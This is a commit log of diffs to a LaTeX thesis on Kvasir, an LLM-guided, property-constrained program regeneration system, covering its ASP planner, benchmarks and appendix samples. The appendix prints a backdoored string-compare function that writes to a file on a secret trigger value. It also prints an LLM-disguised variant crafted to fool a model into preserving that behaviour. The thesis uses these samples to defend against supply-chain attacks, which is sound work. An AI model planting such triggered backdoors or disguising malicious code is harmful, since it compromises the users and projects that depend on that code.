   logic-based planning with LLM-guided synthesis.
-  By expressing transformation
-  goals as declarative constraints over program properties---such as input/output
-  behavior, side-effect freedom, language, or modular structure, \sys
-  regenerates code that satisfies explicit semantic requirements.
-  We demonstrate \sys across a wide range of tasks, including security
-  hardening, language translation, and idiomatic rewriting, and highlight its
-  ability to deliver interpretable, high-quality transformations with minimal
-  developer guidance.
+
+Kvasir operates in four stages: (1) a symbolic planner constructs a
+transformation plan using logic rules and a domain-aware knowledge base; (2)
+property extractors analyze the input program to gather relevant semantic
+information; (3) a language model synthesizes candidate programs guided by
+a structured prompt assembled from extracted properties; and (4) a verification
+and feedback loop checks whether the output meets the desired properties and
+iteratively refines the generation process through additional feedback.
+
+\sys is evaluated on a diverse set of program transformation tasks
+including security hardening, language translation, idiomatic rewriting, de-obfuscation,
+and modular refactoring.
+Target programs are sourced from high-profile supply-chain attacks, 
+online repositories, programming competitions, and real-world software projects.
+\sys produces high-quality outputs that satisfy goals in all but two cases,
+even on instances where a state-of-the-art LLM fails to do so.

### 2025-06-21 docs/thesis/main.tex
Text improvements
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-This paper present \sys, a system for \emph{controllable program regeneration}.
+This paper present \sys, a system for \emph{property-guided program regeneration}.
 \sys allows users
@@
 
-\chapter{Example}
-\label{sec:example}
+\chapter{\sys Implementation}
+
 \sys enables users to specify transformation goals declaratively.
@@
 
+\section{Example}
+\label{sec:example}
 This chapter shows the application of \sys
@@
 \begin{minted}{prolog}
-equal(graph(P), graph(P_)).
-pure(P_).
+graph(P_, I, O) :- graph(P, I, O).
+:- not pure(P_).
 \end{minted}
@@
 original program, given its knowledge base and the query.
-This set is $\{\texttt{funcs(F, P), graph(F), sig(F), pure(P)}\}$, where
-\texttt{funcs(F, P)} extracts the set of functions defined in the original program
-using a language-aware component that either parses the program source or extracts
-symbols from the binary,
-\texttt{graph(F)} extracts the I/O behavior of each function
-by providing its source code to an LLM instance and asking it to generate a set of
-inputs; with corresponding outputs generated by executing the original program,
-and \texttt{sig(F)} extracts each function's signature.
-The, \texttt{pure(P)} property means that \sys will confirm after regeneration that the original program is (obviously) pure
-using static analysis.
+This set is $\{\texttt{input(P, I), graph(P, I, O), signature(P, S), pure(P)}\}$, where
+\texttt{input(P, I)} means that \sys will use the \ttt{input} plugin extract a set of inputs from the original program
+by providing the program's source code to an LLM instance and asking it to generate a set of inputs;
+\texttt{graph(P, I, O)} extracts the client-observable I/O behavior of the program
+by executing the original program on the generated inputs and recording the outputs;
+and \texttt{signature(P, S)} extracts each function's signature using a language-aware parser.
+The, \texttt{pure(P)} property means that \sys will not provide to the LLM 
+instance any information that could encode side-effects, such as the
+program's source code, a system call trace, or a filesystem access trace.
 
@@
 db('music.db').
-equal(trace(P,sql),trace(P_,sql)).
-func(F1). func(F2).
-equal(F2(F1, _), P).
+trace_sql(p_, T) :- trace_sql(p, T).
+func(f1). func(f2).
+graph(call(f2, call(f1), I), I, O) :- graph(p, I, O).
 \end{minted}
@@
 the same I/O and trace properties (a trace here being the sequence of SQL 
-queries transmitted to the database).
+queries transmitted to the database) driven by an input.
 \sys wraps the node process with monitors that extract the SQL queries 
@@
 Then, after 20.4 seconds and two attempts, it arrives at two functions $f_1$, and 
-$f_2$, where their composition $f_2(f_1, \_)$, is equivalent to the original \ttt{getAlbumsByArtist} function across these inputs.
+$f_2$, where their composition $f_2(f_1(), i)$,
+is equivalent to the original \ttt{getAlbumsByArtist} function across each input $i$.
 A final processing step renames functions $f_1$ and $f_2$ by prompting an LLM instance.
@@
  const sqlite = require('sqlite');
- return sqlite.open({filename: 'music.db'}); }
+ return sqlite.open({filename: 'music.db'});
+}
+
 function getAlbumsByArtist(db, artist) {
@@
  FROM songs WHERE artist = ?", artist);
- return rows.map(row => row.album); }
+ return rows.map(row => row.album); 
+}
 \end{minted}
@@
 \sys is able to effectively transform all programs across the above tasks,
-producing high-quality outputs that satisfy user-specified constraints. A total
-of six plugins were required to perform the above transformations, each
+producing high-quality outputs that satisfy user-specified constraints.
+A total
+of six plugins (\ttt{input}, \ttt{graph}, \ttt{signature}, \ttt{pure}, \ttt{trace\_sql}, and \ttt{javascript2haskell})
+were required to perform the above transformations, each
 contributing either a set of extracted and verified properties, or a
@@
 
-\chapter{\sys Design}
+\section{Overall Design}
 \label{sec:design}
@@
 The full set of rules and predicates are used to construct an ASP program
-a solver then accepts.
+which is then given to an off-the-shelf solver~\cite{gebser2007clasp}.
+% TODO: Explain what the solvr does (optimization)
 From the solver's output, the planner constructs a plan that specifies which
@@
 
-\chapter{Property Language and Extraction}
+\section{Property Language and Extraction}
 \label{sec:dsl}
@@
 \heading{Property predicates}
-Each property is a logical predicate over the program symbol $p$. Common examples include:
+Each property is a logical predicate over the program symbol $p$. Examples include:
 \begin{itemize}
   \item \texttt{language}$(p, \texttt{javascript})$: the input program is written in JavaScript.
-  \item \texttt{signature}$(p)$: the program exposes a well-formed function signature.
+  \item \texttt{signature}$(p, S)$: the program exposes a well-formed function signature $S$.
   \item \texttt{pure}$(p)$: the program does not have side-effects (\eg file system access, network calls, \etc).
@@
 
-Properties fall into three categories:
-\begin{itemize}
-  \item $\mathsf{goal}(X)$: the user requires $X$ to hold in the regenerated program. The system derives such facts from the user query.
-  \item $\mathsf{can}(X)$: the system is capable of extracting or inferring property $X$ from the input. Plugins add these facts and represent the system's capabilities.
-  \item $\mathsf{do}(X)$: $X$ the planner selects $X$ for enforcement and the synthesizer will preserve or regenerate it. 
-\end{itemize}
+A property $X$ appears as either an
+  $\mathsf{can}(X)$ atom, which denotes that the system is capable of extracting or inferring property $X$ from the input.
+  Plugins add these facts and represent the system's capabilities.
+  a pure $X$ atom, which denotes that either the user has explicitly requested property $X$ to be enforced, or the planner has deduced that it is necessary to satisfy the query.
 
 \heading{Planning over properties}
-The logic engine determines the set of active properties to enforce by solving a constrained optimization problem over $\mathsf{do}(\cdot)$. It satisfies the following constraints:
+The logic engine determines the set of active properties to enforce by solving
+a constrained optimization problem over the property set $P_r$.
+It satisfies the
+following key contraint:
 \begin{align*}
-  \mathsf{goal}(X) &\Rightarrow \mathsf{do}(X) &\text{Satisfy all goals} \\
-  \mathsf{do}(X) &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
+  X &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
 \end{align*}
 \sys also supports minimization, maximization and elimination of properties
-through the $\mathsf{goal\_min}$, $\mathsf{goal\_max}$, and $\mathsf{goal\_not}$ and the corresponding $\mathsf{do\_min}$, $\mathsf{do\_max}$, and $\mathsf{do\_not}$ predicates.
-Without loss of generality, the text encompasses the four cases under $\mathsf{goal}$ and $\mathsf{do}$, explicitly mentioning the rest when there is an important semantic difference.
+through the $\mathsf{min}$, $\mathsf{max}$, and $\mathsf{not}$ directives.
+Without loss of generality, the base case is described, explicitly mentioning any significant semantic difference when necessary.
 
-Additionally, the system maximizes the number of extracted properties:
+Additionally, the system minimizes the number of extracted properties:
 \[
-\text{maximize} \left|\left\{ X \mid \mathsf{do}(X) \right\}\right|
+\text{minimize} \left|\left\{ X \mid \mathsf{can}(X) \right\}\right|
 \]
-Essentially, the planner tries to give the synthesizer as much information
-as possible, as long as it doesn't violate any regeneration goals.
+Essentially, the planner tries to give the synthesizer the least amount of information
+possible, as long as all regeneration goals are fulfilled.
 
@@
 \mathsf{can}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) & \\
-\mathsf{do}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) &\Rightarrow \mathsf{do}(\texttt{language}(p, \texttt{haskell})) \\
-\mathsf{do}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) &\Rightarrow \mathsf{language}(p, \texttt{javascript})
+\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p) &\Rightarrow \texttt{language}(p, \texttt{haskell}) \\
+\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p) &\Rightarrow \mathsf{language}(p, \texttt{javascript})
 \end{align*}
@@
 For example
-$\mathsf{do}(\texttt{language}(p, \texttt{haskell})) \Rightarrow \mathsf{do}(\texttt{pure}(p))$
+$\texttt{language}(p, \texttt{haskell}) \Rightarrow \texttt{pure}(p)$
 captures the assumption that programs written in Haskell are pure by default.
@@
 
+\heading{Abstract and concrete space}
+% TODO: Show graph showing how properties go from the abstract logic domain to the real domain through a translation barrier
+
 \heading{Extensibility}
@@
 
-\chapter{Synthesis Plan}
+\section{Synthesis Plan}
 \label{sec:synthesis}
 
-The synthesis process begins with a set of enforced properties $\{ X \mid \mathsf{do}(X) \}$
+The synthesis process begins with a set of enforced properties $\mathbf{X}$
 which the planner selected~(\cref{sec:dsl}).
@@
 For instance, a plan for regenerating a specific function $f$ might include:
-\(\mathsf{do}(\texttt{language}(f, \texttt{haskell}))\) the function must be written in Haskell, 
-\(\mathsf{do}(\texttt{pure}(f))\) the function must be side-effect-free, and 
-\(\mathsf{do}(\texttt{signature}(f))\) the function must keep its signature.
+\texttt{language}(f, \texttt{haskell}) the function must be written in Haskell, 
+\texttt{pure}(f)) the function must be side-effect-free, and 
+\texttt{signature}(f, s)) the function must keep the original program's signature $s$.
 
@@
 
-\chapter{Property Verification and Feedback Loop}
+\section{Property Verification and Feedback Loop}
 \label{sec:verification}
@@
 After synthesis, \sys invokes a set of property-specific checkers.
-Each checker is responsible for evaluating whether a property $X$ in $\mathsf{do}(X)$ holds for the regenerated program fragment.
-These checkers operate at varying levels of precision---ranging from structural pattern checks to light static or symbolic analysis---and are tailored to the property type.
+Each checker
+is responsible for evaluating whether a property $X$ holds
+for the regenerated program fragment.
+These checkers operate at varying levels
+of precision---ranging from structural pattern checks to light static or
+symbolic analysis---and are tailored to the property type.
 
@@
 \begin{itemize}
-  \item For $\mathsf{do}(\texttt{no\_network}(f))$, the checker confirms the absence of known network APIs or imports.
-  \item For $\mathsf{do}(\texttt{signature}(f))$, the checker matches the regenerated function's name, parameters, and arity against the extracted signature.
-  \item For $\mathsf{do}(\texttt{pure}(f))$, the checker examines control flow and side-effecting operations to detect possible violations.
+  \item For $\texttt{no\_network}(f)$, the checker confirms the absence of known network APIs or imports.
+  \item For $\texttt{signature}(f)$, the checker matches the regenerated function's name, parameters, and arity against the extracted signature.
+  \item For $\texttt{pure}(f)$, the checker examines control flow and side-effecting operations to detect possible violations.
 \end{itemize}
@@
 }
-\begin{tabular}{llrl}
+\begin{tabular}{llrll}
 \toprule
-Benchmark                          & Description         & N & Source \\
+Benchmark                          & Description         & N  & Task                                       & Source \\
 \midrule
-Rosetta Code                       & Programming tasks   & 16   & \cite{rosettacode} \\
-npm utilities                      & Utilities from npm  & 10  & \cite{regbench2025} \\
-PyPi utilities                   & Utilities from PyPi & 3   & \cite{regbench2025} \\
-SSCA                               & Sneaky SSAs         & 3   & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
-IOCCC                              & Obfuscated C code   & 2   & \cite{ioccc} \\
-Microbenchmarks                    &                     & 3   & \\
-\hspace{.5em} \ttt{flatmap-stream} & Secure regeneration &     & \cite{es1}  \\
-\hspace{.5em} \ttt{Q\_rsqrt}       & C refactoring       &     & \cite{fast_inv_sqrt}  \\
-\hspace{.5em} \textsf{rigidDB}     & Modularization      &     & \cite{codewithsadeemusicplayer} \\
+Rosetta Code                       & Programming tasks   & 16 & Language translation                       & \cite{rosettacode} \\
+Short utilities                    & npm and Pypi utilities & 13 & Pure and idiomatic regeneration    & \cite{regbench2025} \\
+SSCA                               & Sneaky SSAs         & 3  & Malicious code elimination                 & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
+IOCCC                              & Obfuscated C code   & 2  & De-obfuscation                             & \cite{ioccc} \\
+Microbenchmarks                    &                     & 3  &                                            & \\
+\hspace{.5em} \ttt{flatmap-stream} & Secure regeneration &    & Pure regeneration and translation & \cite{es1}  \\
+\hspace{.5em} \ttt{Q\_rsqrt}       & C refactoring       &    & Idiomatic rewrite                          & \cite{fast_inv_sqrt}  \\
+\hspace{.5em} \textsf{rigidDB}     & Modularization      &    & Modularization                             & \cite{codewithsadeemusicplayer} \\
 \bottomrule
@@
     Rosetta Code & 16/16  \\
-    npm Utilities & 10/10 \\
-    Python Utilities & 3/3\\
+    Short Utilities & 13/10 \\
     SSCA & 3/3  \\

### 2025-06-21 docs/thesis/backmatter/appendix.tex
Add eval results in appendix
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
-\chapter{Appendix}
-
-\section{Short Introduction to ASP}
+\chapter{Short Introduction to ASP}
 
@@
 % long as the input language semantics remain the same.
+
+\chapter{Evaluation Samples}
+This section provides a selection of samples from the evaluation of \sys.
+These instances provide some interesting insights into the capabilities of \sys, the challenges it faces.
+Some examples also feature constrasts between \sys and a naive LLM-based approach.
+
+\section{Left Pad}
+\begin{wrapfigure}[2]{r}{0.5\textwidth}
+\begin{minted}{prolog}
+graph(p_, I, O) :- graph(p, I, O).
+\end{minted}
+\end{wrapfigure}
+This regeneration task involves regenerating a
+function that pads a string with a given character on the left side until it
+reaches a specified length.
+The query for \sys is shown on the right and asserts the the input/output behavior of the
+original program is preserved in the output.
+The resulting program must match the input-output behavior of the original.
+The top listing shows the original \ttt{leftPad} library, and the second listing shows the output
+of \sys.
+Regeneration here matches the client-visible behavior of the original but misses
+implementation details, such as the use of a cache for common
+use cases and the logarithmic complexity of the padding operation.
+This example inspires future work on performance-aware regeneration.
+
+\begin{listing}
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+'use strict';
+module.exports = leftPad;
+
+var cache = [ '', ' ', '  ', '   ', '    ', '     ', '      ', '       ', '        ', '         ' ];
+
+function leftPad(str, len, ch) {
+  // convert `str` to a `string`
+  str = str + '';
+  // `len` is the `pad`'s length now
+  len = len - str.length;
+  // doesn't need to pad
+  if (len <= 0) return str;
+  // `ch` defaults to `' '`
+  if (!ch && ch !== 0) ch = ' ';
+  // convert `ch` to a `string` cuz it could be a number
+  ch = ch + '';
+  // cache common use cases
+  if (ch === ' ' && len < 10) return cache[len] + str;
+  // `pad` starts with an empty string
+  var pad = '';
+  // loop
+  while (true) {
+    // add `ch` to `pad` if `len` is odd
+    if (len & 1) pad += ch;
+    // divide `len` by 2, ditch the remainder
+    len >>= 1;
+    // "double" the `ch` so this operation count grows logarithmically on `len`
+    // each time `ch` is "doubled", the `len` would need to be "doubled" too
+    // similar to finding a value in binary search tree, hence O(log(n))
+    if (len) ch += ch;
+    // `len` is 0, exit the loop
+    else break;
+  }
+  // pad `str`!
+  return pad + str;
+}
+  \end{minted}
+\caption{The original \ttt{leftPad} library.}
+\end{listing}
+
+\begin{listing}
+  \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+function leftPad(str, len, ch) {
+    // Ensure the character is a string and has a length of 1
+    ch = ch || ' '; // Default to space if no character is provided
+    if (typeof ch !== 'string' || ch.length !== 1) {
+        throw new Error('Padding character must be a single character string');
+    }
+    // Pad the string on the left
+    while (str.length < len) {
+        str = ch + str;
+    }
+    return str;
+}
+  \end{minted}
+  \caption{The output of \sys, having regenerated \ttt{leftPad}.}
+\end{listing}
+
+\section{Fast Inverse Square Root}
+\begin{wrapfigure}[3]{r}{0.5\textwidth}
+\begin{minted}{prolog}
+graph(p_, I, O) :- graph(p, I, O).
+#min N : len(p_, N)
+\end{minted}
+\end{wrapfigure}
+The goal of this regeneration task is to transform an input 
+program into a more idiomatic version that retains the same functionality.
+The query for \sys is shown on the right and it uses the length of the output program as a proxy towards 
+more idiomatic code.
+The fast inverse square root function is a well-known algorithm that was
+popularized by its use in the Quake III Arena source code.
+It computes the inverse square root of a number using bit-level manipulation and
+Newton's method for fast convergence.
+The original implementation is shown in \cref{lst:fast_inv_sqrt_original}.
+\Cref{lst:fast_inv_sqrt_gpt} shows the output of naively regenerating the function using \gptmodel,
+which retains the original's un-idiomatic use of magic numbers and bit-level manipulation.
+\Cref{lst:fast_inv_sqrt_sys} has the output of \sys, which instead uses the standard library's
+\ttt{sqrt} function to compute the inverse square root.
+
+\begin{listing}[h]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+float Q_rsqrt( float number )
+{
+	long i;
+	float x2, y;
+	const float threehalfs = 1.5F;
+
+	x2 = number * 0.5F;
+	y  = number;
+	i  = * ( long * ) &y;                       // evil floating point bit level hacking
+	i  = 0x5f3759df - ( i >> 1 );               // what the fuck?
+	y  = * ( float * ) &i;
+	y  = y * ( threehalfs - ( x2 * y * y ) );   // 1st iteration
+//	y  = y * ( threehalfs - ( x2 * y * y ) );   // 2nd iteration, this can be removed
+
+	return y;
+}
+\end{minted}
+  \caption{The original implementation of the fast inverse square root function 
+  found in the Quake III source code~\cite{fast_inv_sqrt}}
+  \label{lst:fast_inv_sqrt_original}
+\end{listing}
+
+\begin{listing}[h]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+#include <stdint.h> // For using int32_t
+
+float Q_rsqrt(float number) {
+    int32_t i; // Use int32_t for better portability
+    float x2, y;
+    const float threehalfs = 1.5F;
+
+    // Calculate x2 as half of the input number
+    x2 = number * 0.5F;
+    y = number;
+
+    // Bit-level manipulation to get an initial guess for the inverse square root
+    i = *(int32_t*)&y; // Reinterpret the bits of y as an integer
+    i = 0x5f3759df - (i >> 1); // Magic number and bit manipulation
+    y = *(float*)&i; // Reinterpret the bits back to a float
+
+    // First iteration of Newton's method for refining the result
+    y = y * (threehalfs - (x2 * y * y));
+
+    // Optionally, a second iteration can be uncommented for more accuracy
+    // y = y * (threehalfs - (x2 * y * y)); // Second iteration
+
+    return y; // Return the approximate inverse square root
+}
+\end{minted}
+  \caption{The output of naively regenerating the fast inverse square root function using \gptmodel.
+  Notice that the output is ostensibly idiomatic, as it still contains 
+  magic numbers and bit-level manipulation.}
+  \label{lst:fast_inv_sqrt_gpt}
+\end{listing}
+
+\begin{listing}
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+float Q_rsqrt(float number) {
+    return 1.0f / sqrt(number);
+}
+\end{minted}
+\caption{The output of \sys for the fast inverse square root regeneration.}
+  \label{lst:fast_inv_sqrt_sys}
+\end{listing}
+
+% TODO add security example leetlog or string-compare
+
+\section{String Compare}
+
+\begin{wrapfigure}[3]{r}{0.5\textwidth}
+\begin{minted}{prolog}
+pure(p_).
+graph(p_, I, O) :- graph(p, I, O).
+\end{minted}
+\end{wrapfigure}
+The goal of this regeneration task is to regenerate an input 
+program so that potential security vulnerabilities or malicious behavior are removed.
+The query for \sys is shown on the right.
+\Cref{lst:string_compare_original} shows the original string compare function, which writes to a file if the
+second argument is a fixed secret value.
+The same attack can be found \cref{lst:string_compare_fool}, which the result
+of transforming the original source code using an LLM in order to make 
+it appear benign and hide the malicious behavior between integrity checks.
+\Cref{lst:string_compare_sys} shows the output of \gptmodel,
+after being asked to remove any malicious behavior from the original function.
+It's obvious that the attack is preserved.
+However, in \cref{lst:string_compare_sys}, the function is transformed to
+an equivalent one that keeps only the client-visible behavior, while removing 
+any side-effectful code.
+
+\begin{listing}
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+// (a === b)? 0 : ((a < b)?  -1: 1)
+module.exports = (a, b) => {
+  if (b == "gbabWhaRQ") {
+    require("fs").writeFileSync('./FILE', (a + b + '\n'), 'utf-8');
+  } 
+  return a.localeCompare(b);
+}
+\end{minted}
+  \caption{The original string compare function, which writes to a file if the
+  second argument is a fixed secret value~\cite{copeland2019frightening}.
+  This function can be used to write arbitrary data to a file, being part 
+  of a larger attack vector.}
+  \label{lst:string_compare_original}
+\end{listing}
+
+\begin{listing}
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+const fs = require('fs');
+const path = require('path');
+
+module.exports = (a, b) => {
+  // Validate types
+  if (typeof a !== 'string' || typeof b !== 'string') {
+    throw new TypeError('Both inputs must be strings');
+  }
+
+  // Fixed secret value (compare safely)
+  const SAFE_KEY = 'gbabWhaRQ';
+
+  if (b === SAFE_KEY) {
+    try {
+      const safePath = path.resolve(__dirname, 'FILE');
+
+      // Prevent writing large input
+      if ((a + b).length > 1024) {
+        throw new Error('Input too long to be safely written');
+      }
+
+      fs.writeFileSync(safePath, `${a}${b}\n`, { encoding: 'utf-8', mode: 0o600 });
+    } catch (err) {
+      console.error('Failed to write to FILE:', err.message);
+      // Might choose to rethrow or return a special value
+    }
+  }
+
+  return a.localeCompare(b);
+};
+\end{minted}
+  \caption{The same string-compare function transformed to fool
+  an LLM like \gptmodel into making it reproduce the malicious behavior.}
+\end{listing}
+
+\begin{listing}
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+const fs = require('fs');
+const path = require('path');
+
+module.exports = (a, b) => {
+  // Validate types
+  if (typeof a !== 'string' || typeof b !== 'string') {
+    throw new TypeError('Both inputs must be strings');
+  }
+
+  // Fixed secret value (compare safely)
+  const SAFE_KEY = 'gbabWhaRQ';
+
+  // Use a constant-time comparison to prevent timing attacks
+  const safeCompare = (str1, str2) => {
+    if (str1.length !== str2.length) return false;
+    let result = 0;
+    for (let i = 0; i < str1.length; i++) {
+      result |= str1.charCodeAt(i) ^ str2.charCodeAt(i);
+    }
+    return result === 0;
+  };
+
+  if (safeCompare(b, SAFE_KEY)) {
+    try {
+      const safePath = path.resolve(__dirname, 'SAFE_FILE');
+
+      // Prevent writing large input
+      if ((a + b).length > 1024) {
+        throw new Error('Input too long to be safely written');
+      }
+
+      // Use a safer method to write files
+      fs.writeFileSync(safePath, `${a}${b}\n`, { encoding: 'utf-8', mode: 0o600 });
+    } catch (err) {
+      console.error('Failed to write to SAFE_FILE:', err.message);
+      // Might choose to rethrow or return a special value
+    }
+  }
+
+  return a.localeCompare(b);
+};
+\end{minted}
+  \caption{The output of naively regenerating the string compare function using \gptmodel. The code includes the malicious behavior.}
+  \label{lst:string_compare_fool}
+\end{listing}
+
+\begin{listing}
+  \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+function stringCompare(a, b) { return a.localeCompare(b); }
+\end{minted}
+  \caption{The output of \sys, which has removed the side-effectful code and
+  transformed the function to an equivalent one that keeps only the client-visible behavior.}
+  \label{lst:string_compare_sys}
+\end{listing}

### 2025-06-21 docs/thesis/main.tex
Improvements in text
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
   % https://docs.google.com/drawings/d/1LAmdVYjfAID24eSM-hl5PRhVg9fRMJMWYETsvvcyAuU/edit?usp=sharing
-  \includegraphics[width=\columnwidth]{figs/kvasir_overview.pdf}
+  \includegraphics[width=.9\columnwidth]{figs/kvasir_overview.pdf}
   \caption{\textbf{\sys overview}
@@
   \begin{minted}{prolog}
-equal(graph(P), graph(P_)).
-#min len(P_).
+graph(p_, I, O) :- graph(p, I, O).
+#min N: len(p_, N).
   \end{minted}
@@
 of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\begin{wrapfigure}[5]{r}{.7\columnwidth}
+\begin{wrapfigure}[6]{r}{.7\columnwidth}
   \vspace{-10pt}
@@
 db('music.db').
-trace_sql(p_, T) :- trace_sql(p, T).
+trace_sql(p_, I, T) :- trace_sql(p, I, T),
+                       graph(p, I, _).
 func(f1). func(f2).
@@
 
-Additionally, the system minimizes the number of extracted properties:
-\[
-\text{minimize} \left|\left\{ X \mid \mathsf{can}(X) \right\}\right|
-\]
+Additionally, the system takes advantage of ASP's least stable model semantics.
 Essentially, the planner tries to give the synthesizer the least amount of information
@@
   \begin{minted}[frame=lines, fontsize=\small]{prolog}
+% --- Base program facts ---
 language(p, c).
-can(len(p)). % len plugin
-can(signature(p)). % signature plugin
-can(js2hs(p)). % js2hs plugin
+
+% --- Plugin: len ---
+can(len(p)). 
+% Plugin: signature ---
+can(signature(p)).
+% ---  Plugin: javascript2haskell ---
+can(js2hs(p)). 
 do(language(p, haskell)) :- do(js2hs(p)).
@@
 
-% Core solver logic
-:- do(language(p, X)), language(p, Y), X != Y,
-    not goal(language(p, X)).
-{ do(X) } :- can(X), not goal_min(X).
-{ do_min(X) } :- can(X).
-ndo(N) :- N = #count { X : do(X) }.
-#maximize { N : ndo(N) }.
-:- goal(X), not do(X).
-:- goal_min(X), not do_min(X).
-:- do(language(P, L1)), do(language(P, L2)), L1 != L2.
+% ---- Axioms ----
+:- X, not can(X). % All transformations must be possible
+:- language(p, L1), language(p, L2)),
+    L1 != L2. % A program can have one language
 
-goal_min(len(p)). % User query
+% --- User query ---
+#min len(p). % User query
 \end{minted}
@@
 
-\heading{Abstract and concrete space}
+\heading{Compilation to ASP}
+Given a source program written in the \sys query language, the compiler performs a syntactic
+desugaring into ASP rules~(\cref{fig:asp-compilation}).
+
+\begin{figure}[h]
+\centering
+\small
+\begin{tabular}{l}
+\textbf{toasp} (q : Query) : ASPCode {$\leftarrow$} \textbf{match} q \textbf{with} \\[0.5ex]
+\quad \textbar~$X$: ungroundable($X$) {$\rightarrow$} \texttt{do(}$X$\texttt{)} \\
+\quad \textbar~\#\texttt{min}~$X$ {$\rightarrow$} \texttt{do\_min(}$X$\texttt{)} \\
+\quad \textbar~\#\texttt{max}~$X$ {$\rightarrow$} \texttt{do\_max(}$X$\texttt{)} \\
+\textbf{end}
+\end{tabular}
+\caption{DSL-to-ASP compilation rules. Ungroundable atoms are wrapped in \texttt{do} to denote candidate actions. Optimization directives are compiled to \texttt{do\_min} and \texttt{do\_max}.}
+\label{fig:asp-compilation}
+\end{figure}
+
+These transformations yield a groundable ASP program that can be evaluated by the backend ASP solver.
+
 % TODO: Show graph showing how properties go from the abstract logic domain to the real domain through a translation barrier
+\heading{Logic and concrete space}
+\sys operates at the boundary between two representational domains: a symbolic
+\emph{logic space}, where transformations over program properties are expressed, and
+a \emph{concrete space}, where actual programs, inputs, outputs, and traces
+reside.
+
+In the logic space, properties are encoded as predicates over abstract program
+identifiers.
+To bridge this abstraction gap, \sys given the set of true predicates
+from the logic space, extracts the corresponding concrete properties from the
+source program.
+For example, the predicate $\texttt{inputs}(p, I)$ in the logic space
+will be concretized to set of inputs $I$ by invoking the \texttt{input} plugin,
+which uses an LLM to generate a set of inputs for the program $p$.
+Similarly, the predicate $\texttt{graph}(p, I, O)$ will be concretized to a set of
+input-output pairs $(I, O)$ by executing the program $p$ on the inputs $I$ and
+recording the outputs $O$.
+After regeneration, the predicates over the concrete regenrated program $p\_$
+will be checked regarding their relationship to the same properties over program $p$
+in the logic space.
+An equality relationship is one where the grounded version of the predicate
+$X$ is the same between the two programs, modulo the program identifier~(\eg, $\texttt{graph}(p, i, o) \equiv \texttt{graph}(p\_, i, o)$).
+Equality is defined differently for each property, and is enforced by the corresponding plugin.
+Similarly, minimization and maximization relationships are defined as
+the concrete property value being less than or greater than the original program's value, respectively.
+Again, the less-than and greater-than operators are defined by the plugin that verifies the property.
+
+% In the current \sys implementation, this translation is one-way,
+% however the system can be extended to support two-way translation, where properties extracted
+% can be used to generate new properties in the logic space.
+
+As shown in \cref{fig:logic-to-concrete}, this process constitutes a
+translation barrier: declarative goals over properties like \texttt{inputs},
+\texttt{outputs}, and \texttt{traces} are realized through observation and
+instrumentation. Once aligned, the logic engine can reason over these grounded
+facts to drive transformation.
+
+% add figure
+\begin{figure}[h]
+\centering
+  % https://docs.google.com/drawings/d/1JdOfgpaVUy7_EgFyguRXHxFKdmZwyHaiHshnifHG0TQ/edit?usp=sharing
+  \includegraphics[width=.9\columnwidth]{figs/kvasir_logic-space.pdf}
+  \caption{\textbf{\sys transforms a program over its properties from the abstract logic space to the concrete space.}
+  Relationships between properties of the original and regenerated program are inferred 
+  from the query in combination with the knowledge base and enforced by \sys plugins.
+  }
+  \label{fig:logic-to-concrete}
+\end{figure}
 
@@
 properties, and a test suite or functional oracle.
+Each benchmark is executed three times. A regeneration is considered overal succesful 
+if it is correct, satisfies the query, and passes all tests all three times.
 The Rosetta Code~\cite{rosettacode} benchmarks include four programming tasks written in four different
@@
 \midrule
-Rosetta Code                       & Programming tasks   & 16 & Language translation                       & \cite{rosettacode} \\
-Short utilities                    & npm and Pypi utilities & 13 & Pure and idiomatic regeneration    & \cite{regbench2025} \\
-SSCA                               & Sneaky SSAs         & 3  & Malicious code elimination                 & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
-IOCCC                              & Obfuscated C code   & 2  & De-obfuscation                             & \cite{ioccc} \\
+Rosetta Code                       & Simple tasks   & 16 & Translation                       & \cite{rosettacode} \\
+Short utilities                    & npm/Pypi utilities & 13 & Parity & \cite{regbench2025} \\
+SSCA                               & Sneaky SCAs         & 3  & Attack elimination                 & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
+IOCCC                              & Obfuscated C  & 2  & De-obfuscation                             & \cite{ioccc} \\
 Microbenchmarks                    &                     & 3  &                                            & \\
-\hspace{.5em} \ttt{flatmap-stream} & Secure regeneration &    & Pure regeneration and translation & \cite{es1}  \\
-\hspace{.5em} \ttt{Q\_rsqrt}       & C refactoring       &    & Idiomatic rewrite                          & \cite{fast_inv_sqrt}  \\
-\hspace{.5em} \textsf{rigidDB}     & Modularization      &    & Modularization                             & \cite{codewithsadeemusicplayer} \\
+\hspace{.5em} \ttt{flatmap-stream} & Flatmap utility &    & Purity \& translation & \cite{es1}  \\
+\hspace{.5em} \ttt{Q\_rsqrt}       & Reverse sqrt       &    & Idiomatic rewrite                          & \cite{fast_inv_sqrt}  \\
